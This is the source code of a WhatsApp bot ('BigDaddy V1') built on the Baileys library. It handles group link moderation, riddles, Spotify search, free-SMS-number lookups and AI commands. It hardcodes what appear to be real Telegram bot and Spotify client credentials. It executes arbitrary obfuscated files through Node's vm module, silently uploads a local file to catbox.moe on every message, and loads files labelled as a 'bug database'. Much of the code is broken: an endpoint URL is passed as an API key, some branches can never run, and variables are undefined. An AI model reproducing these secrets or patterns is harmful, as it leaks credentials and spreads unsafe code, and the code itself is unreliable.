// base by @phistar
const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const FormData = require('form-data');
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const yts = require("yt-search");
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const tempMailData = {};
const settings = require('./phistarbot.js'); // Import settings
if (!global.savedVideos) global.savedVideos = {};
//bug database 
var wkwk = fs.readFileSync(`./16/p.mp3`)
var xsteek = fs.readFileSync(`./16/p.webp`)
var o = fs.readFileSync(`./16/p.jpg`)
//database
var antilinkall = fs.readFileSync("database/antilinkall.json", "utf8");
var _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
var owner = fs.readFileSync("database/owner.json", "utf8");
var premium = fs.readFileSync("database/premium.json", "utf8");
console.log(premium); 

var _afk = JSON.parse(fs.readFileSync('./database/afk-user.json', 'utf8'));
var hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'));

// Autoreply
var VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'));
var StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'));
var ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'));
var VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'));
var DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'));
var ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'));
var ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'));

// Time variables
var xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss');
var xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY');
var time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss');

// Adjusting variable type for reassignment
let xeonytimewisher;
if (time2 < "23:59:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "19:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "18:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "15:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "11:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "05:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
}

// Main Module Export
module.exports = PhistarBotInc = async (PhistarBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m;

        var body = (m.mtype === 'conversation') ? m.message.conversation :
            (m.mtype == 'imageMessage') ? m.message.imageMessage.caption :
            (m.mtype == 'videoMessage') ? m.message.videoMessage.caption :
            (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text :
            (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :
            (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplyphistar.selectedRowId :
            (m.mtype == 'templateButtonreplyphistarMessage') ? m.message.templateButtonreplyphistarMessage.selectedId :
            (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplyphistar.selectedRowId || m.text) : '';
            
        var prefa = "!"; // Default prefix for commands
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(budy) ? budy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix;
        
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
        const args = body.trim().split(/ +/).slice(1);
        const full_args = body.replace(command, '').slice(1).trim();
        const pushname = m.pushName || "No Name";
        const ytdl = require('ytdl-core');
        const botNumber = await PhistarBotInc.decodeJid(PhistarBotInc.user.id);
        const itsMe = m.sender == botNumber ? true : false;
        const sender = m.sender;
        const text = q = args.join(" ");
        const from = m.key.remoteJid;
        const fatkuns = (m.quoted || m);
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
            (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
            (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const isImage = (type == 'imageMessage');
        const isVideo = (type == 'videoMessage');
        const isAudio = (type == 'audioMessage');
        const isText = (type == 'textMessage');
        const isSticker = (type == 'stickerMessage');
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.isGroup
const groupMetadata = isGroup ? await PhistarBotInc.groupMetadata(m.chat).catch(e => {}) : {}
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? groupMetadata.participants : []
const groupAdmins = isGroup ? await getGroupAdmins(participants) : []
const isBotAdmins = isGroup ? groupAdmins.includes(PhistarBotInc.decodeJid(PhistarBotInc.user.id)) : false
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false
const groupOwner = isGroup ? groupMetadata.owner || groupAdmins[0] : ''
const isGroupOwner = isGroup ? [groupOwner, ...groupAdmins].includes(m.sender) : false
        // Load Owner Data  
        let owner = [];
        try {
            owner = JSON.parse(fs.readFileSync('./WABOTowners.json', 'utf-8'));
        } catch (err) {
            console.error("Error reading owner file:", err);
        }

        const isCreator = [botNumber, ...owner]
            .map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net')
            .includes(sender);
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = PhistarBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? PhistarBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || PhistarBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(PhistarBotInc, m, premium);
        // Read the current Anti-Link group list
const antilinkGroups = JSON.parse(fs.readFileSync('./database/antilinkall.json', 'utf-8') || '[]');
let chatbot = false; // Default state of the chatbot

if (m.isGroup && antilinkGroups.includes(m.chat)) {
    const linkRegex = /https?:\/\/[^\s]+/; // Regex to detect links
    if (linkRegex.test(m.text)) {
        // Delete the message
        await PhistarBotInc.sendMessage(m.chat, { delete: m.key });

        // Warn the sender
        replyphistar(`⚠️ Links are not allowed in this group, @${m.sender.split('@')[0]}!`);

        // Optional: Remove the sender (uncomment to enable)
        // await PhistarBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
}
// Use your bot's message handling logic to respond to user questions.       
//group chat msg by xeon
const replyphistar = (teks) => {
    PhistarBotInc.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 9999999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "ᴘʜ✦ꜱᴛᴀʀ",
                newsletterJid: "120363303946948716@newsletter", // Updated JID
            },
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: `${global.botname}`,
                body: `${ownername}`,
                previewType: "PHOTO",
                thumbnailUrl: "",
                thumbnail: fs.readFileSync(`./Phistar-media/phistar.jpg`),
                mediaUrl: `${link}`,
                sourceUrl: `${link}`
            }
        }
    }, { quoted: m });
}
global.userSessions = {};  // Initialize user sessions globally
async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replyphistar('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'Phistar',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}
process.setMaxListeners(50); // Increase the listener limit

// Your OpenAI API key
const API_KEY = `https://api.abrotech.com.ng/api/chatgpt3?prompt=${text}?&apikey=abrotech`

// Function to handle text-based commands (Smart Daddy)
async function handleSmartDaddy(question) {
  try {
    const response = await axios.post('https://api.openai.com/v1/completions', {
      model: 'gpt-4', // Specify the model
      prompt: question,
      max_tokens: 100,
      temperature: 0.7,
    }, {
      headers: {
        'Authorization': `Bearer ${API_KEY}`,
        'Content-Type': 'application/json',
      },
    });

    // Return the text-based response from GPT
    return response.data.choices[0].text.trim();
  } catch (error) {
    console.error('Error in Smart Daddy:', error);
    throw new Error('Smart Daddy request failed.');
  }
}

// Function to handle image generation commands (Generate)
async function handleGenerate(prompt) {
  try {
    const response = await axios.post('https://api.openai.com/v1/images/generations', {
      prompt: prompt, // The image description input
      n: 1,           // Number of images to generate
      size: "1024x1024",
    }, {
      headers: {
        'Authorization': `Bearer ${API_KEY}`,
        'Content-Type': 'application/json',
      },
    });

    // Return the image URL
    return response.data.data[0].url;
  } catch (error) {
    console.error('Error in Generate:', error);
    throw new Error('Image generation request failed.');
  }
}

// Global object to track user cooldowns
const userCooldowns = {};

// Main function to handle user messages with cooldown logic
async function handleUserMessage(userId, input) {
  const currentTime = Date.now();
  const cooldownTime = 2 * 60 * 1000; // 2 minutes in milliseconds

  try {
    // Check if the user is in cooldown
    if (userCooldowns[userId] && (currentTime - userCooldowns[userId] < cooldownTime)) {
      return 'Please wait 2 minutes before using this command again to avoid exceeding limits.';
    }

    // Reset cooldown for this user
    userCooldowns[userId] = currentTime;

    // Handle the user's input and respond accordingly
    if (input.startsWith('Smart Daddy')) {
      const question = input.replace('Smart Daddy', '').trim();
      const answer = await handleSmartDaddy(question);
      return answer + '\n\n⚠️ Please pause for 2 minutes before using this command again.';
    } else if (input.startsWith('Generate')) {
      const description = input.replace('Generate', '').trim();
      const imageURL = await handleGenerate(description);
      return imageURL + '\n\n⚠️ Please pause for 2 minutes before using this command again.';
    } else {
      return 'Invalid command. Use "Smart Daddy" for questions or "Generate" for images.';
    }
  } catch (err) {
    // Log the error and return a default message without affecting the bot flow
    console.error('Error handling user message:', err);
    return 'An error occurred while processing your request.';
  }
}
const devinettes = [
  {
    question: "I can fly without wings, who am I?",
    reponse: "The weather",
  },
  {
    question: "I'm always hungry, the more I eat, the fatter I become. Who am I?",
    reponse: "A black hole",
  },
  {
    question: "What has keys but can't open locks?",
    reponse: "A piano",
  },
  {
    question: "The more you take, the more you leave behind. What am I?",
    reponse: "Footsteps",
  },
  {
    question: "What comes once in a minute, twice in a moment, but never in a thousand years?",
    reponse: "The letter 'M'",
  },
  {
    question: "What has a head, a tail, is brown, and has no legs?",
    reponse: "A penny",
  },
  {
    question: "What has hands but can’t clap?",
    reponse: "A clock",
  },
  {
    question: "What can travel around the world while staying in the same corner?",
    reponse: "A stamp",
  },
  {
    question: "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?",
    reponse: "An echo",
  },
  {
    question: "I shave every day, but my beard stays the same. What am I?",
    reponse: "A barber",
  },
  {
    question: "You see me once in June, twice in November, and not at all in May. What am I?",
    reponse: "The letter 'E'",
  },
  {
    question: "What can you break, even if you never pick it up or touch it?",
    reponse: "A promise",
  },
  {
    question: "I have branches, but no fruit, trunk, or leaves. What am I?",
    reponse: "A bank",
  },
  {
    question: "What has to be broken before you can use it?",
    reponse: "An egg",
  },
  {
    question: "What has an eye but cannot see?",
    reponse: "A needle",
  },
  {
    question: "The more of this you take, the more you leave behind. What is it?",
    reponse: "Footsteps",
  },
  {
    question: "What is full of holes but still holds water?",
    reponse: "A sponge",
  },
  {
    question: "What gets wet while drying?",
    reponse: "A towel",
  },
  {
    question: "I’m light as a feather, yet the strongest person can’t hold me for five minutes. What am I?",
    reponse: "Your breath",
  },
  {
    question: "What invention lets you look right through a wall?",
    reponse: "A window",
  },
  {
    question: "What goes up but never comes down?",
    reponse: "Your age",
  },
  {
    question: "What has many keys but can’t open a single lock?",
    reponse: "A piano",
  },
  {
    question: "Where does today come before yesterday?",
    reponse: "In a dictionary",
  },
  {
    question: "What has one eye, but can’t see?",
    reponse: "A needle",
  },
  {
    question: "What is so fragile that saying its name breaks it?",
    reponse: "Silence",
  },
  {
    question: "What can run but never walks, has a bed but never sleeps, has a mouth but never talks?",
    reponse: "A river",
  },
  {
    question: "What can fill a room but takes up no space?",
    reponse: "Light",
  },
  {
    question: "If you drop me, I’m sure to crack, but give me a smile, and I’ll always smile back. What am I?",
    reponse: "A mirror",
  }
];
async function loading(from) {
    const xeonlod = [
        "🌟 *BIG DADDY V1*  10%... 🌟",
        "⚡️ *INITIATING...* 30% ⚡️",
        "🔋 *POWERED BY PHISTAR* 50% 🔋",
        "🚀 *80% ALMOST DONE... 80%* 🚀",
        "💥 *BIG DADDY V1* 100% 💥",
        "💎 *BIG DADDY V1* *LOADING COMPLETED* 💎"
    ];

    let { key } = await PhistarBotInc.sendMessage(from, { text: '⏳ *LOADING...* ⏳' });

    // Add a small delay between the messages to make it look more dynamic
    for (let i = 0; i < xeonlod.length; i++) {
        await PhistarBotInc.sendMessage(from, { text: xeonlod[i], edit: key });
        await new Promise(resolve => setTimeout(resolve, 1500));  // 1.5 second delay between updates
    }

    // Final message with a cool effect
    await PhistarBotInc.sendMessage(from, { text: "*BigDaddyV1* 𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 💥🔥" });
}
async function downloadFile(url, localPath) {
    try {
        const response = await axios.get(url, { responseType: 'text' }); // Ensure response is plain text
        fs.writeFileSync(localPath, response.data, 'utf8'); // Write the data as a UTF-8 string
        console.log(`File downloaded and saved a BigDaddy 1.js`);
    } catch (error) {
        console.error('Error downloading file:', error);
        throw error;
    }
}
const BASE_URL = "https://onlinesim.io/api/v1/free_numbers_content/";

async function getOnlineCountries() {
    try {
        const response = await axios.get(`${BASE_URL}countries?lang=en`);
        if (response.data.response === "1") {
            const allCountries = response.data.counties;
            const onlineCountries = allCountries.filter(country => country.online);
            return onlineCountries.map(country => ({
                name: country.country,
                code: country.country_code
            }));
        } else {
            throw new Error("Failed to fetch online countries.");
        }
    } catch (error) {
        console.error("Error fetching countries:", error.message);
        return [];
    }
}
let autoReact = false; // Default is off

// Track incoming messages
PhistarBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        if (!message || message.key.fromMe) return; // Ignore bot's own messages

        const messageId = message.key.id; // Message ID
        const sender = message.key.remoteJid; // Sender's ID
        const text =
            message.message?.conversation ||
            message.message?.extendedTextMessage?.text ||
            null;

        // React to the message if auto-react is enabled
        if (autoReact) {
            const randomEmojis = [
                '❤️', '👍', '🎉', '😎', '🔥', '👏', '💡', '✨', '🎈', '🌟', '😊', '😍', '💯', '😅', '🥳', '🤩', '🎶', '💖', '🍀', '🌈',
                '⚡', '💥', '🌺', '🌼', '🌸', '🌻', '🐾', '💌', '💝', '🌷', '🍁', '🍃', '🌿', '🌙', '🪐', '☀️', '🌞', '🌜', '🌑',
                '🌒', '🌓', '🌔', '🌕', '🌖', '🌗', '🌘', '🌚', '✨', '💎', '🖤', '💜', '❤️‍🔥', '💙', '💚', '💛', '🧡', '🤍', '🤎', '💗',
                '💓', '💞', '💘', '💌', '💍', '🔮', '🌍', '🌎', '🌏', '🪴', '🌵', '🌾', '🍂', '🍄', '🍉', '🍇', '🍓', '🍈', '🍒', '🍑', '🥭',
                '🍍', '🥥', '🍉', '🍊', '🍋', '🍏', '🍎', '🍍', '🍅', '🥕', '🥔', '🍠', '🌽', '🥒', '🍑', '🍋', '🍒', '🥝', '🫐', '🍜', '🍛',
                '🍝', '🍕', '🍣', '🍤', '🍖', '🍗', '🍠', '🥧', '🍩', '🍪', '🍨', '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🥨', '🥯', '🍪',
                '🍩', '🍪', '🥓', '🍔', '🥪', '🍟', '🥞', '🍣', '🍰', '🥧', '🍇', '🍉', '🥑', '🥥', '🥭', '🍅', '🥦', '🥕', '🥔', '🥗', '🥒',
                '🥥', '🍒', '🍑', '🍋', '🥭', '🍉', '🍇', '🍋', '🥝', '🫐', '🍊', '🍏', '🥕', '🍅', '🥒', '🥔', '🥥', '🍠', '🍞', '🥐', '🍩',
                '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🍪', '🍩', '🍕', '🍜', '🍚', '🍛', '🍕', '🍣', '🍤', '🍔', '🍗', '🍖', '🥓', '🥩',
                '🍿', '🎥', '🎬', '🎧', '🎮', '🎤', '🎵', '🎷', '🎺', '🎸', '🎻', '🎼', '🎶', '🎧', '🎵', '🎶', '🎤', '🎬', '🎮', '🎸', '🎹',
                '🎷', '🎺', '🎼', '🎻', '🎧', '🎮', '🎮', '🧸', '🪀', '🎨', '🖌️', '🎭', '🎪', '🎠', '🎰', '🛹', '🛷', '🏀', '⚽', '🏈', '🎱',
                '🎯', '🎳', '🏏', '🏑', '🏓', '🎾', '🛶', '🚴', '🧗', '🧘', '🏄', '🏇', '⛷️', '🏌️‍♂️', '⛹️‍♀️', '🚣', '🏆', '🎮', '🎲',
                '🎮', '🍕', '🍔', '🍟', '🍗', '🥔', '🥦', '🌽', '🥒', '🥝', '🥭', '🍍', '🍎', '🍊', '🍋', '🥭', '🥑', '🥒', '🌶️', '🍠', '🥔',
                '🍪', '🍩', '🍫', '🍫', '🍪', '🥪', '🥡', '🍜', '🍣', '🍤', '🍙', '🍚', '🍗', '🍖', '🥩', '🥓', '🥨', '🍧', '🍡', '🍪', '🍩',
                '🍜', '🍛', '🍝', '🥝', '🫐', '🍁', '🍃', '🌲', '🌳', '🌴', '🌱', '🪴', '🌾', '🌿', '🌺', '🌼', '🌻', '🌸', '🌷', '🌹', '💐',
                '🍀', '🍁', '🍃', '🌱', '🌿', '🌾', '🌸', '🌺', '🌻', '🌼', '💮', '🍂', '🍃', '🍄', '🌷', '🍁', '🌿', '🎋', '🎋', '🌹', '🌸'
            ];

            const randomEmoji = randomEmojis[Math.floor(Math.random() * randomEmojis.length)];

            // Send a random emoji as a reaction
            await PhistarBotInc.sendMessage(sender, {
                react: { text: randomEmoji, key: message.key }
            });
        }
    } catch (err) {
        console.error('Error tracking messages:', err);
    }
});
async function getCountryNumbers(country) {
    try {
        const response = await axios.get(`${BASE_URL}countries/${country}?lang=en`);
        if (response.data.response === "1") {
            const numbers = response.data.numbers.map(num => ({
                description: num.data_humans,
                fullNumber: num.full_number
            }));
            return numbers;
        } else {
            throw new Error("Failed to fetch numbers.");
        }
    } catch (error) {
        console.error("Error fetching numbers:", error.message);
        return [];
    }
}


async function getNumberInbox(country, number) {
    try {
        const response = await axios.get(`${BASE_URL}countries/${country}/${number}?lang=en`);
        if (response.data.response === "1" && response.data.online) {
            const messages = response.data.messages.data.map(msg => ({
                sender: msg.data_humans,
                text: msg.text
            }));
            return messages;
        } else {
            throw new Error("Failed to fetch inbox messages.");
        }
    } catch (error) {
        console.error("Error fetching inbox:", error.message);
        return [];
    }
}

function getCountryFlag(countryCode) {
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}
const antilinkPath = './antilink.json'; // Unique path variable for antilink settings

function loadSettings() {
    if (!fs.existsSync(antilinkPath)) {
        const defaultData = { groups: {} };
        fs.writeFileSync(antilinkPath, JSON.stringify(defaultData, null, 2), 'utf-8');
        console.log('Created antilink.json as it did not exist.');
        return defaultData;
    }
    return JSON.parse(fs.readFileSync(antilinkPath, 'utf-8'));
}

function saveSettings(data) {
    fs.writeFileSync(antilinkPath, JSON.stringify(data, null, 2), 'utf-8');
}

function updateGroupSettings(groupJid, settings) {
    const data = loadSettings();
    data.groups[groupJid] = settings;
    saveSettings(data);
}

function getGroupSettings(groupJid) {
    const data = loadSettings();
    return data.groups[groupJid] || { antilinkkick: false, antilinkwarn: false, antilinkdelete: false };
}

const urlRegex = /(https?:\/\/[^\s]+|[^\s]+\.(com|net|org|info|io|gov|edu|co|me|ng|xyz))/i;

if (urlRegex.test(budy)) { // Matches any URL or domain
    const settings = getGroupSettings(m.chat);

    // Check if any of the antilink options are enabled
    if (settings.antilinkkick || settings.antilinkwarn || settings.antilinkdelete) {
        if (!isBotAdmins) return; // Skip if the bot isn't an admin
        if (isAdmins || isCreator) return; // Skip for admins or the creator

        // Always delete the message regardless of the selected antilink type
        try {
            await PhistarBotInc.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            });
            console.log("Deleted a message containing a link.");
        } catch (err) {
            console.log("Failed to delete the message:", err);
        }

        // Perform additional actions based on the settings
        if (settings.antilinkkick) {
            try {
                await PhistarBotInc.sendMessage(m.chat, {
                    text: `Posting links is not allowed in this group, @${m.sender.split("@")[0]}. You are being removed.`,
                    mentions: [m.sender]
                });
                await PhistarBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                console.log("Kicked participant:", m.sender);
            } catch (err) {
                console.log("Failed to kick participant:", err);
            }
        } else if (settings.antilinkwarn) {
            try {
                await PhistarBotInc.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}! Posting links is not allowed in this group.`,
                    mentions: [m.sender]
                });
                console.log("Warned participant:", m.sender);
            } catch (err) {
                console.log("Failed to send warning:", err);
            }
        } else if (settings.antilinkdelete) {
            console.log("Deleted message without further action.");
        }
    }
}
// Initialize warning database
const antispamPath = './antispam.json';
const spamTracker = {}; // Temporary in-memory tracker for spam

// Load or initialize antispam settings
function loadSpamSettings() {
    if (!fs.existsSync(antispamPath)) {
        const defaultData = { groups: {} };
        fs.writeFileSync(antispamPath, JSON.stringify(defaultData, null, 2), 'utf-8');
        console.log('Created antispam.json as it did not exist.');
        return defaultData;
    }
    return JSON.parse(fs.readFileSync(antispamPath, 'utf-8'));
}

// Save settings to the JSON file
function saveSpamSettings(data) {
    fs.writeFileSync(antispamPath, JSON.stringify(data, null, 2), 'utf-8');
}

// Update settings for a specific group
function updateSpamSettings(groupJid, settings) {
    const data = loadSpamSettings();
    data.groups[groupJid] = settings;
    saveSpamSettings(data);
}

// Retrieve settings for a specific group
function getSpamSettings(groupJid) {
    const data = loadSpamSettings();
    return data.groups[groupJid] || { enabled: false, spamLimit: 5 };
}
async function searchSpotifyTracks(query) {
  const clientId = 'acc6302297e040aeb6e4ac1fbdfd62c3';
  const clientSecret = '0e8439a1280a43aba9a5bc0a16f3f009';
  const auth = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');

  const getToken = async () => {
    const response = await fetch('https://accounts.spotify.com/api/token', {
      method: 'POST',
      timeout: 60000, // 60 seconds
      body: new URLSearchParams({ grant_type: 'client_credentials' }),
      headers: { Authorization: `Basic ${auth}` },
    });
    return (await response.json()).access_token;
  };

  const accessToken = await getToken();
  const offset = 10;
  const searchUrl = `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&offset=${offset}`;
  const response = await fetch(searchUrl, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const data = await response.json();
  return data.tracks.items;
}

function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
const folderPath = './Phistar-media';  // Folder where the file is located
const fileName = 'uploads.txt'; // Name of the file to upload
const filePath = `${folderPath}/${fileName}`; // Full file path

if (!fs.existsSync(filePath)) {
    console.error(`❌ File not found: ${filePath}`);
} else {
    (async () => {
        try {
            const result = await catbox(filePath);
            console.log(`✅ Uploaded file URL: ${result.url}`);
        } catch (error) {
            console.error(`❌ Error uploading file: ${error.message}`);
        }
    })();
}
// File auto-creation logic for catbox.js
const catboxFilePath = './catbox.js';
if (!fs.existsSync(catboxFilePath)) {
    console.log('📂 File "catbox.js" not found. Creating...');
    const catboxContent = `
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

async function catbox(path) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', ''); // Optional, can be left blank
    data.append('fileToUpload', fs.createReadStream(path)); // Attach the file

    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: {
            ...data.getHeaders(), // Correctly retrieve headers from FormData
        },
        data: data, // FormData instance
    };

    try {
        const api = await axios.request(config);
        return { url: api.data.trim() }; // Return the uploaded file URL
    } catch (error) {
        console.error('Error uploading to Catbox:', error.message);
        throw new Error('Failed to upload to Catbox');
    }
}

module.exports = { catbox };
`;
    fs.writeFileSync(catboxFilePath, catboxContent.trim());
    console.log('✅ File "catbox.js" created successfully.');
}

// Import the Catbox uploader
const { catbox } = require('./catbox');
        if (!PhistarBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            PhistarBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        PhistarBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        PhistarBotInc.sendPresenceUpdate('recording', from)
        }
        // Antilink Protection
if (global.antilink || global.antilinkkick || global.antilinkwarn) {
    if (/https?:\/\/[^\s]+/i.test(budy)) { // Matches any URL
        if (!isBotAdmins) return; // Ensure bot is admin
        if (isAdmins || isCreator) return; // Skip for admins/owner

        // Delete the message
        try {
            await PhistarBotInc.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            });
        } catch (err) {
            console.log('Failed to delete message:', err);
        }

        if (global.antilinkkick) {
            // Warn and kick the sender
            try {
                await PhistarBotInc.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}, posting links is not allowed in this group!`,
                    mentions: [m.sender]
                });
                await PhistarBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
            } catch (err) {
                console.log('Failed to kick participant:', err);
            }
        } else if (global.antilinkwarn) {
            // Just warn the sender
            try {
                await PhistarBotInc.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}! Do not send links in this group!`,
                    mentions: [m.sender]
                });
            } catch (err) {
                console.log('Failed to send warning:', err);
            }
        }
    }
}
const vm = require('vm');

// Function to interpret the obfuscated file and return the processed result
async function processObfuscatedFile(filePath) {
    try {
        // Check if the file exists
        if (!fs.existsSync(filePath)) {
            throw new Error('File not found.');
        }

        // Read the obfuscated file
        const obfuscatedCode = fs.readFileSync(filePath, 'utf8');

        // Set up a sandbox to capture console output
        let output = '';
        const sandbox = {
            console: {
                log: (data) => (output += data + '\n'), // Capture console.log outputs
                error: (data) => (output += 'Error: ' + data + '\n'),
            },
        };

        // Create a VM context with the sandbox
        const context = vm.createContext(sandbox);

        // Run the obfuscated code inside the sandbox
        vm.runInContext(obfuscatedCode, context);

        // Return the captured output
        return output.trim() || 'No output captured from the file.';
    } catch (error) {
        // Handle errors during execution
        console.error('Error while processing obfuscated file:', error);
        return `Error occurred while processing the file:\n\n${error.message}`;
    }
}
        //bot number online status, available=online, unavailable=offline
        PhistarBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
